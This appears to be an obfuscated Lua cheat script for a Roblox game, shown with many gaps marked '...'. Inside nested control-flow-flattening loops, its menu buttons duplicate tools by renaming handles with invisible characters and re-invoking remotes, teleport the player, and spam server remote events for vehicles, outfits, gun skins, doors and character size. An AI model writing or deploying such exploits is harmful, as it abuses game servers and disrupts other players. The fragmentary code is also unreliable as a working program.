									if (FlatIdent_5E9C == 1) then
										FlatIdent_5F20A = 3;
										break;
									end
								end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_1DA5F;
						while true do
							if (FlatIdent_F664 == 0) then
								FlatIdent_1DA5F = 0;
								while true do
									if (FlatIdent_1DA5F == 0) then
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_890E5;
						while true do
							if (0 == FlatIdent_93E2) then
								FlatIdent_890E5 = 0;
								while true do
									if (FlatIdent_890E5 == 2) then
										Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694";
										Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056";
										FlatIdent_890E5 = 3;
									end
									if (FlatIdent_890E5 == 3) then
										Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716";
										break;
									end
									if (FlatIdent_890E5 == 0) then
										...
										while true do
											...
											if (FlatIdent_6580B == 1) then
												FlatIdent_890E5 = 1;
												break;
											end
										end
									end
									if (1 == FlatIdent_890E5) then
							...
							if (FlatIdent_4CBD6 == 0) then
								...
								while true do
									if (FlatIdent_2C5C0 == 1) then
										local FlatIdent_49276 = 0;
										while true do
											if (FlatIdent_49276 == 0) then
												Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766";
												Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852";
												FlatIdent_49276 = 1;
											end
											if (FlatIdent_49276 == 1) then
												FlatIdent_2C5C0 = 2;
												break;
											end
										end
						...
						while true do
							if (FlatIdent_929B3 == 0) then
								...
								while true do
									...
									if (FlatIdent_2FB2F == 2) then
										local FlatIdent_10082 = 0;
										while true do
											if (0 == FlatIdent_10082) then
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_68240;
						while true do
							if (0 == FlatIdent_5B631) then
								FlatIdent_68240 = 0;
								while true do
									if (FlatIdent_68240 == 0) then
									...
									if (3 == FlatIdent_68240) then
										Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677";
										break;
									end
									if (FlatIdent_68240 == 2) then
										Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524";
										Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257";
										FlatIdent_68240 = 3;
									end
									if (FlatIdent_68240 == 1) then
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_7AC3E;
						while true do
							if (FlatIdent_37B33 == 0) then
								FlatIdent_7AC3E = 0;
								while true do
									if (3 == FlatIdent_7AC3E) then
										Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151";
										break;
									end
									if (2 == FlatIdent_7AC3E) then
										local FlatIdent_201B9 = 0;
										while true do
											if (1 == FlatIdent_201B9) then
												FlatIdent_7AC3E = 3;
												break;
											end
											if (0 == FlatIdent_201B9) then
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						while true do
							...
							if (FlatIdent_35673 == 1) then
								local FlatIdent_60A62 = 0;
								while true do
									if (0 == FlatIdent_60A62) then
							...
							if (FlatIdent_35673 == 2) then
								Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936";
								Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713";
								FlatIdent_35673 = 3;
							end
							if (FlatIdent_35673 == 3) then
								Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863";
								break;
							end
						end
							...
							if (FlatIdent_72C32 == 0) then
								...
								while true do
									...
									if (FlatIdent_5D59E == 0) then
										Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3541114300";
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						for m = 1, 2 do
							local FlatIdent_62F71 = 0;
							while true do
								if (FlatIdent_62F71 == 0) then
									task.wait();
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
									break;
								end
						...
						for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
							if toollel:IsA("Tool") then
								if (toollel.Name == toolselcted) then
									local FlatIdent_76E65 = 0;
									while true do
										if (FlatIdent_76E65 == 0) then
											toollllfoun2 = true;
											for basc, aijfw in pairs(toollel:GetDescendants()) do
												if (aijfw.Name == "Handle") then
													local FlatIdent_C895 = 0;
													local FlatIdent_5D4F7;
													while true do
														if (FlatIdent_C895 == 0) then
															FlatIdent_5D4F7 = 0;
															while true do
																if (0 == FlatIdent_5D4F7) then
																	local FlatIdent_48D17 = 0;
																	while true do
																		if (FlatIdent_48D17 == 1) then
																			FlatIdent_5D4F7 = 1;
																			break;
																		end
																		if (FlatIdent_48D17 == 0) then
																			aijfw.Name = "H⁥a⁥n⁥d⁥l⁥e";
																			toollel.Parent = game.Players.LocalPlayer.Backpack;
																			FlatIdent_48D17 = 1;
																		end
						...
						if (toollllfoun2 == true) then
							...
							local FlatIdent_59EC8;
							while true do
								if (FlatIdent_452D3 == 0) then
									FlatIdent_59EC8 = 0;
									while true do
										if (1 == FlatIdent_59EC8) then
											toollllfoun2 = false;
											break;
										end
						...
						wait(2);
						for m = 1, dupeamot do
							local FlatIdent_6EB64 = 0;
							local args;
							while true do
								if (FlatIdent_6EB64 == 2) then
									game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "H⁥a⁥n⁥d⁥l⁥e";
									game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
									game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
									repeat
										local FlatIdent_4648E = 0;
										local FlatIdent_161B8;
										while true do
								...
								if (FlatIdent_6EB64 == 0) then
									local FlatIdent_57798 = 0;
									while true do
										if (FlatIdent_57798 == 1) then
											if (m <= dupeamot) then
												game:GetService("StarterGui"):SetCore("SendNotification", {
													["Title"] = "Dupe Script",
													["Text"] = "Now you got"   .. " "   .. m   .. " "   .. "Duped"   .. " "   .. toolselcted   .. "!" ,
										...
										if (FlatIdent_57798 == 2) then
											FlatIdent_6EB64 = 1;
											break;
										end
										if (0 == FlatIdent_57798) then
											if (duping == false) then
												local FlatIdent_2EE94 = 0;
												local FlatIdent_98205;
												while true do
				...
				local loopRunning1 = false;
				local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait() ;
				function equipToolAndFireEvent1(tool)
					local FlatIdent_78F80 = 0;
					local args;
					while true do
						if (FlatIdent_78F80 == 2) then
							if (character:FindFirstChild("Guitar") and character.Guitar:FindFirstChild("ToolSound")) then
								local FlatIdent_77D12 = 0;
								while true do
									if (FlatIdent_77D12 == 0) then
										character.Guitar.ToolSound:FireServer(unpack(args));
										print("Fired FireServer for: "   .. tool.Name );
										break;
									end
								end
							else
								print("No Guitar or ToolSound in the player character.");
							end
							break;
						end
						...
						if (0 == FlatIdent_526B0) then
							...
							while true do
								if (FlatIdent_43525 == 0) then
									while loopRunning1 do
										print("Started a new cycle.");
										tools = {};
										for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
											if tool:IsA("Tool") then
												table.insert(tools, tool);
										...
										if ( #tools == 0) then
											print("No tools in the backpack.");
											break;
										end
										for _, tool in pairs(tools) do
											if  not loopRunning1 then
												break;
											end
											equipToolAndFireEvent1(tool);
											wait(0.1);
										end
				...
				game.Players.LocalPlayer.CharacterAdded:Connect(function(newCharacter)
					...
					while true do
						if (FlatIdent_66B51 == 1) then
							if loopRunning1 then
								cycleThroughSlots1();
							end
							break;
						end
						if (FlatIdent_66B51 == 0) then
							local FlatIdent_874D3 = 0;
							while true do
								if (FlatIdent_874D3 == 0) then
									print("Character respawned.");
									character = newCharacter;
									FlatIdent_874D3 = 1;
								end
								if (FlatIdent_874D3 == 1) then
									FlatIdent_66B51 = 1;
									break;
								end
							end
				...
				Tab:AddToggle({
					["Name"] = "Music 1 glitched (Only Guitar)",
					["Default"] = false,
					["Callback"] = function(Value)
						local FlatIdent_8B930 = 0;
						local FlatIdent_411DF;
						while true do
							if (FlatIdent_8B930 == 0) then
								FlatIdent_411DF = 0;
								while true do
									if (FlatIdent_411DF == 0) then
										loopRunning1 = Value;
										if loopRunning1 then
											local FlatIdent_27AA8 = 0;
											local FlatIdent_7CA52;
											while true do
				...
				local function fireRemote(eventName, args)
					...
					local FlatIdent_2E3E;
					local remote;
					while true do
						if (FlatIdent_6617B == 1) then
							while true do
								if (FlatIdent_2E3E == 0) then
									remote = ReplicatedStorage:WaitForChild("RE"):WaitForChild(eventName);
									if remote then
							...
							while true do
								if (0 == FlatIdent_3265F) then
									...
									while isRunning do
										...
										local FlatIdent_1ED9E;
										while true do
											if (FlatIdent_2542C == 0) then
												FlatIdent_1ED9E = 0;
												while true do
													if (1 == FlatIdent_1ED9E) then
														wait(0.4);
														break;
													end
				...
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam Horse and color ",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							local FlatIdent_4C7CA = 0;
							while true do
								if (0 == FlatIdent_4C7CA) then
									print("Rozpoczynam proces pobierania konia.");
									startProcess();
									break;
								end
							end
							...
							while true do
								if (FlatIdent_2A71E == 0) then
									print("Zatrzymuję proces pobierania konia.");
									stopProcess();
									break;
								end
							end
				...
				local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s");
				local isRunning = false;
				local ids = {
					"18960464228",
					"18960491426",
				...
				local function sendGunSkinsLoop()
					while isRunning do
				...
				local function startSending()
					if  not isRunning then
						...
						local FlatIdent_42F48;
						while true do
							if (0 == FlatIdent_443BF) then
								FlatIdent_42F48 = 0;
								while true do
									if (FlatIdent_42F48 == 0) then
										isRunning = true;
										coroutine.wrap(sendGunSkinsLoop)();
										break;
									end
								end
								break;
				...
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam RGB Gun Skins (all Guns)",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSending();
				...
				print("Skrypt do wielokrotnego wysyłania 'RequestingGunSkins' gotowy.");
				local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r");
				local isRunning = false;
				local function sendWheelNumber()
					while isRunning do
						local args = {
							[1] = "WheelNumber"
						};
				...
				print("Przygotowano skrypt do wysyłania 'WheelNumber'.");
				local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r");
				local isRunning = false;
				local function sendLights()
					while isRunning do
						local args = {
							[1] = "Lights"
						};
				...
				print("Przygotowano skrypt do wysyłania 'Lights'.");
				local isRunning = false;
				local function sendFlip()
					while isRunning do
						local args = {
							[1] = "Flip"
						};
				...
				local function startSending()
					if  not isRunning then
						local FlatIdent_2B4DB = 0;
						while true do
							if (FlatIdent_2B4DB == 0) then
								isRunning = true;
								sendFlip();
								break;
							end
				...
				local function requestCarModels()
					while isRunning do
						for _, carModel in ipairs(carModels) do
							...
							local args;
							while true do
								if (FlatIdent_52AD == 0) then
									local FlatIdent_9258A = 0;
									while true do
										if (FlatIdent_9258A == 0) then
											args = {
												[1] = "PickingCar",
												[2] = carModel
											};
				...
				local function startRequestingCarModels()
					if  not isRunning then
						local FlatIdent_C6CA = 0;
						local FlatIdent_683E6;
						while true do
							if (FlatIdent_C6CA == 0) then
								FlatIdent_683E6 = 0;
								while true do
				...
				local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clothe1s");
				local isRunning = false;
				local outfits = {
					{
						"7592201637",
				...
				local function sendOutfit(id1, id2)
				...
				local function startSendingOutfits()
					while isRunning do
								...
								if (FlatIdent_7CFD7 == 0) then
									...
									while true do
										if (0 == FlatIdent_4E115) then
											...
											sendOutfit(outfit[1], outfit[2]);
											FlatIdent_4E115 = 1;
										end
										if (1 == FlatIdent_4E115) then
											wait(0.5);
											break;
										end
									end
				...
				Tab:AddToggle({
					["Name"] = "Start/Stop Changing Outfits",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSending();
				...
				print("Przygotowano skrypt do wysyłania strojów.");
				local ids = {
					"18124980670",
					"18124970215",
					"14544396959",
				...
				local replicatedStorage = game:GetService("ReplicatedStorage");
				local remoteEvent = replicatedStorage:WaitForChild("RE"):WaitForChild("1Jo1b");
				local isRunning = false;
				local function sendJobIDs()
					while isRunning do
						for _, id in ipairs(ids) do
							if  not isRunning then
								break;
				...
				local function startSendingJobIDs()
					if  not isRunning then
						local FlatIdent_6652A = 0;
						local FlatIdent_57297;
						while true do
							if (FlatIdent_6652A == 0) then
								FlatIdent_57297 = 0;
								while true do
									if (FlatIdent_57297 == 0) then
										isRunning = true;
										sendJobIDs();
										break;
									end
				...
				local function stopSendingJobIDs()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam Job",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSendingJobIDs();
				...
				local replicatedStorage = game:GetService("ReplicatedStorage");
				local remoteEvent = replicatedStorage:WaitForChild("RE"):WaitForChild("1Bab1yFollo1w");
				local isRunning = false;
				local function sendCharacterSelection()
					while isRunning do
				...
				local function startSendingCharacters()
					if  not isRunning then
						local FlatIdent_7531 = 0;
						local FlatIdent_6395;
						while true do
				...
				local function stopSendingCharacters()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam Children",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSendingCharacters();
						else
							stopSendingCharacters();
						end
					end
				});
				local ReplicatedStorage = game:GetService("ReplicatedStorage");
				local clothingEvent = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s");
				local sizes = {
					0.55,
					0.6,
					0.65,
				...
				local isRunning = false;
				local currentIndex = 1;
				local function startSizeAdjustment()
										...
										while true do
											if (FlatIdent_3ECBA == 0) then
												if (currentIndex <= #sizes) then
													local FlatIdent_66C7C = 0;
													local sizeValue;
													local args;
													local success;
													local err;
													while true do
														if (FlatIdent_66C7C == 1) then
															success, err = pcall(function()
																clothingEvent:FireServer(unpack(args));
															end);
															if success then
																print("Successfully updated character size to: "   .. sizeValue );
															else
																print("Error updating character size: "   .. tostring(err) );
															end
															FlatIdent_66C7C = 2;
														end
														if (0 == FlatIdent_66C7C) then
														...
														if (FlatIdent_95507 == 0) then
															...
															while true do
																...
																if (FlatIdent_5AE7A == 0) then
																	print("Reached maximum size, reversing...");
																	currentIndex = #sizes;
																	FlatIdent_5AE7A = 1;
																end
															end
														end
														if (FlatIdent_95507 == 1) then
															while (currentIndex >= 1) and isRunning  do
				...
				local function stopSizeAdjustment()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam Size",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSizeAdjustment();
				...
				local isRunning = false;
				local function sendCurtainEvents()
					while isRunning do
						remoteEvent:FireServer(unpack(args));
						wait(0.4);
					end
				end
				function startSendingCurtainEvents()
					if  not isRunning then
						local FlatIdent_1529E = 0;
						local FlatIdent_80438;
						while true do
							if (FlatIdent_1529E == 0) then
								FlatIdent_80438 = 0;
								while true do
									if (FlatIdent_80438 == 0) then
										isRunning = true;
										sendCurtainEvents();
										break;
									end
				...
				local function stopSendingCurtainEvents()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam Curtain",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSendingCurtainEvents();
						else
							stopSendingCurtainEvents();
						end
					end
				});
				args = {
				...
				replicatedStorage = game:GetService("ReplicatedStorage");
				remoteEvent = replicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sHous1e");
				isRunning = false;
				function sendLockDoorEvents()
					while isRunning do
						local FlatIdent_35634 = 0;
						while true do
							if (0 == FlatIdent_35634) then
								remoteEvent:FireServer(unpack(args));
								wait(0.4);
								break;
							end
				...
				function startSendingLockDoorEvents()
					if  not isRunning then
						local FlatIdent_1ADAC = 0;
						while true do
							if (FlatIdent_1ADAC == 0) then
								isRunning = true;
								sendLockDoorEvents();
								break;
							end
				...
				function stopSendingLockDoorEvents()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam Lock Door",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSendingLockDoorEvents();
						else
							stopSendingLockDoorEvents();
						end
					end
				});
				args = {
				...
				function startSendingGarageDoorEvents()
					if  not isRunning then
						local FlatIdent_2F821 = 0;
						local FlatIdent_3630A;
						while true do
							if (FlatIdent_2F821 == 0) then
								FlatIdent_3630A = 0;
								while true do
									if (FlatIdent_3630A == 0) then
										isRunning = true;
										sendGarageDoorEvents();
										break;
									end
								end
								break;
				...
				function stopSendingGarageDoorEvents()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop Spam Garage Door",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSendingGarageDoorEvents();
						else
							stopSendingGarageDoorEvents();
						end
					end
				});
				Section = Tab:AddSection({
				...
				Tab:AddDropdown({
					["Name"] = "Fire Hose Power:",
					["Default"] = "",
					["Options"] = {
						"Small Power Fire Hose",
						"Big Power Fire Hose",
						"Giant Power Fire Hose"
					},
					["Callback"] = function(Value)
						if (Value == "Small Power Fire Hose") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							wait();
							toolselcted = "FireHose";
							dupeamot = 15;
							picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l");
							cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s");
							game:GetService("StarterGui"):SetCore("SendNotification", {
							...
							for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
								if toollll:IsA("Tool") then
									if (toollll.Name == toolselcted) then
										...
										local FlatIdent_921B1;
										while true do
											if (FlatIdent_2D31C == 0) then
												FlatIdent_921B1 = 0;
												while true do
													if (FlatIdent_921B1 == 0) then
														toollllfoun = true;
														for nana, jjsjsj in pairs(toollll:GetDescendants()) do
															if (jjsjsj.Name == "Handle") then
							...
							if (toollllfoun2 == true) then
								...
								local FlatIdent_3105F;
								while true do
									if (0 == FlatIdent_52E79) then
										FlatIdent_3105F = 0;
										while true do
							...
							wait(2);
							for m = 1, dupeamot do
								local FlatIdent_125AB = 0;
								local FlatIdent_12C8;
								local args;
								while true do
									if (FlatIdent_125AB == 1) then
										while true do
								...
								if tool:IsA("Tool") then
									...
									while true do
										...
										if (FlatIdent_4C237 == 1) then
											gripPos = nil;
											while true do
												if (1 == FlatIdent_4A5C4) then
													gripPos = TablaGripPos[gripPosIndex];
													if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
												...
												if (0 == FlatIdent_4A5C4) then
													...
													while true do
														...
														if (FlatIdent_4BE74 == 0) then
															tool.Parent = game.Players.LocalPlayer.Character;
															gripPosIndex = math.min(i, #TablaGripPos);
															FlatIdent_4BE74 = 1;
														end
													end
												end
						...
						elseif (Value == "Big Power Fire Hose") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if toollel:IsA("Tool") then
									if (toollel.Name == toolselcted) then
										...
										local FlatIdent_604DF;
										while true do
											if (FlatIdent_80E57 == 0) then
												FlatIdent_604DF = 0;
												while true do
													...
													if (FlatIdent_1BF35 == 0) then
														...
														for nana, jjsjsj in pairs(toollll:GetDescendants()) do
															if (jjsjsj.Name == "Handle") then
																...
																local FlatIdent_46B30;
																while true do
																	if (FlatIdent_192B8 == 0) then
																		FlatIdent_46B30 = 0;
																		while true do
																			if (FlatIdent_46B30 == 1) then
																				...
																				while true do
																					...
																					if (FlatIdent_6350F == 1) then
																						FlatIdent_46B30 = 2;
																						break;
																					end
																				end
																			end
																			if (FlatIdent_46B30 == 0) then
																				toollll.Parent = game.Players.LocalPlayer.Character;
																				wait();
																				FlatIdent_46B30 = 1;
																			end
																			if (FlatIdent_46B30 == 2) then
																				toollll.Parent = game.Players.LocalPlayer.Character;
																				toolllffel = toollll;
																				break;
																			end
							...
							if (toollllfoun == true) then
								...
								local FlatIdent_215E4;
								while true do
									if (FlatIdent_7A554 == 0) then
										FlatIdent_215E4 = 0;
										while true do
											if (FlatIdent_215E4 == 0) then
									...
									if (FlatIdent_509CD == 1) then
										while true do
											if (2 == FlatIdent_4F8DC) then
												if (duping == false) then
													local FlatIdent_1CC95 = 0;
													while true do
														if (0 == FlatIdent_1CC95) then
											...
											if (FlatIdent_4F8DC == 1) then
												local FlatIdent_651F7 = 0;
												while true do
													if (FlatIdent_651F7 == 1) then
														game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
														FlatIdent_4F8DC = 2;
														break;
													end
													if (FlatIdent_651F7 == 0) then
														args = {
															[1] = "PickingTools",
															[2] = toolselcted
														};
							...
							for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if tool:IsA("Tool") then
									...
									local FlatIdent_8208F;
									local gripPosIndex;
									local gripPos;
									while true do
										if (1 == FlatIdent_5387A) then
											gripPos = nil;
											while true do
						...
						elseif (Value == "Giant Power Fire Hose") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							for m = 1, 2 do
								local FlatIdent_54AC4 = 0;
								local FlatIdent_61F5C;
								while true do
									if (FlatIdent_54AC4 == 0) then
										FlatIdent_61F5C = 0;
										while true do
							...
							for m = 1, dupeamot do
								...
								while true do
									...
									if (1 == FlatIdent_1FCB5) then
										while true do
											if (FlatIdent_E617 == 0) then
												local FlatIdent_5C43E = 0;
												while true do
													if (FlatIdent_5C43E == 0) then
														if (duping == false) then
															local FlatIdent_5DC1F = 0;
															local FlatIdent_35651;
															while true do
																if (FlatIdent_5DC1F == 0) then
																	FlatIdent_35651 = 0;
																	while true do
																		if (0 == FlatIdent_35651) then
																			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																			return;
																		end
																	end
								...
								if tool:IsA("Tool") then
									...
									while true do
										...
										if (FlatIdent_27442 == 0) then
											local FlatIdent_4A1B2 = 0;
											while true do
												if (FlatIdent_4A1B2 == 0) then
													tool.Parent = game.Players.LocalPlayer.Character;
													gripPosIndex = math.min(i, #TablaGripPos);
													FlatIdent_4A1B2 = 1;
												end
												if (FlatIdent_4A1B2 == 1) then
													FlatIdent_27442 = 1;
													break;
												end
											end
				...
				Tab:AddDropdown({
					...
					["Default"] = "",
					["Options"] = {
						"Small Power FlashLight",
						"Big Power FlashLight",
						"Giant Power FlashLight"
					},
					["Callback"] = function(Value)
						if (Value == "Small Power FlashLight") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							wait();
							toolselcted = "FlashLight";
							dupeamot = 15;
							picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l");
							cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s");
							game:GetService("StarterGui"):SetCore("SendNotification", {
							...
							for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
								if toollll:IsA("Tool") then
									if (toollll.Name == toolselcted) then
										local FlatIdent_12256 = 0;
										while true do
											if (0 == FlatIdent_12256) then
												toollllfoun = true;
												for nana, jjsjsj in pairs(toollll:GetDescendants()) do
													if (jjsjsj.Name == "Handle") then
							...
							if (toollllfoun == true) then
								...
								local FlatIdent_332B4;
								while true do
									if (FlatIdent_28289 == 0) then
										FlatIdent_332B4 = 0;
										while true do
											if (1 == FlatIdent_332B4) then
												toollllfoun = false;
												break;
											end
											if (FlatIdent_332B4 == 0) then
												if (game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil) then
													toollllfoun = false;
												end
												repeat
							...
							for m = 1, dupeamot do
								...
								local FlatIdent_8DC44;
								local args;
								while true do
									if (FlatIdent_7450B == 1) then
										while true do
											if (FlatIdent_8DC44 == 3) then
												game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
												game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
												repeat
													local FlatIdent_5BBF = 0;
											...
											if (2 == FlatIdent_8DC44) then
												if (duping == false) then
													local FlatIdent_2C0BB = 0;
													local FlatIdent_89850;
													while true do
														if (FlatIdent_2C0BB == 0) then
															FlatIdent_89850 = 0;
															while true do
																if (0 == FlatIdent_89850) then
																	local FlatIdent_273D3 = 0;
																	while true do
																		if (FlatIdent_273D3 == 0) then
																			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
																			return;
																		end
																	end
							...
							for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
								if tool:IsA("Tool") then
									local FlatIdent_21352 = 0;
									local gripPosIndex;
									local gripPos;
									while true do
										if (FlatIdent_21352 == 0) then
						...
						elseif (Value == "Big Power FlashLight") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
								if toollel:IsA("Tool") then
									if (toollel.Name == toolselcted) then
										...
										local FlatIdent_4FC88;
										while true do
											if (FlatIdent_46B28 == 0) then
												FlatIdent_4FC88 = 0;
												while true do
													if (0 == FlatIdent_4FC88) then
														toollllfoun2 = true;
														for basc, aijfw in pairs(toollel:GetDescendants()) do
															if (aijfw.Name == "Handle") then
									...
									if (toollll.Name == toolselcted) then
										...
										for nana, jjsjsj in pairs(toollll:GetDescendants()) do
											if (jjsjsj.Name == "Handle") then
												...
												local FlatIdent_862BD;
												while true do
													if (FlatIdent_584DC == 0) then
														FlatIdent_862BD = 0;
														while true do
															if (FlatIdent_862BD == 0) then
																toollll.Parent = game.Players.LocalPlayer.Character;
																wait();
																FlatIdent_862BD = 1;
															end
															if (FlatIdent_862BD == 1) then
							...
							if (toollllfoun2 == true) then
								local FlatIdent_2BAA8 = 0;
								while true do
									if (FlatIdent_2BAA8 == 1) then
										toollllfoun2 = false;
										break;
									end
									if (FlatIdent_2BAA8 == 0) then
										if (game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil) then
											toollllfoun2 = false;
										end
										repeat
							...
							for m = 1, dupeamot do
								...
								while true do
									...
									if (FlatIdent_5116A == 1) then
										while true do
											if (0 == FlatIdent_54C85) then
												local FlatIdent_68201 = 0;
												while true do
													if (FlatIdent_68201 == 2) then
														FlatIdent_54C85 = 1;
														break;
													end
													if (FlatIdent_68201 == 1) then
														if (m <= dupeamot) then
															game:GetService("StarterGui"):SetCore("SendNotification", {
																["Title"] = "Dupe Script",
																["Text"] = "Now you got"   .. " "   .. m   .. " "   .. "Duped"   .. " "   .. toolselcted   .. "!" ,
													...
													if (FlatIdent_68201 == 0) then
														if (duping == false) then
															local FlatIdent_51E4F = 0;
															local FlatIdent_5EA98;
															while true do
											...
											if (FlatIdent_54C85 == 2) then
												game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "H⁥a⁥n⁥d⁥l⁥e";
												game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
												game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
												repeat
													local FlatIdent_2E9B6 = 0;
													local FlatIdent_37634;
													while true do
														if (0 == FlatIdent_2E9B6) then
															FlatIdent_37634 = 0;
															while true do
											...
											if (FlatIdent_54C85 == 1) then
												picktoolremote:InvokeServer(unpack(args));
												game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
												if (duping == false) then
													local FlatIdent_88550 = 0;
													local FlatIdent_7299E;
													while true do
						...
						elseif (Value == "Giant Power FlashLight") then
							args = {
								[1] = "ClearAllTools"
							};
							game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args));
							...
							for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
								if toollll:IsA("Tool") then
									if (toollll.Name == toolselcted) then
										...
										local FlatIdent_6A42C;
										while true do
											if (FlatIdent_17649 == 0) then
												FlatIdent_6A42C = 0;
												while true do
													if (FlatIdent_6A42C == 0) then
														toollllfoun = true;
														for nana, jjsjsj in pairs(toollll:GetDescendants()) do
															if (jjsjsj.Name == "Handle") then
							...
							if (toollllfoun == true) then
								...
								local FlatIdent_457EE;
								while true do
									if (FlatIdent_148EA == 0) then
										FlatIdent_457EE = 0;
										while true do
											if (FlatIdent_457EE == 1) then
												toollllfoun = false;
												break;
											end
											if (FlatIdent_457EE == 0) then
							...
							for m = 1, dupeamot do
								...
								local FlatIdent_97782;
								local args;
								while true do
									if (FlatIdent_2B953 == 1) then
										while true do
											if (FlatIdent_97782 == 0) then
												if (duping == false) then
													local FlatIdent_7D6F7 = 0;
													local FlatIdent_665A5;
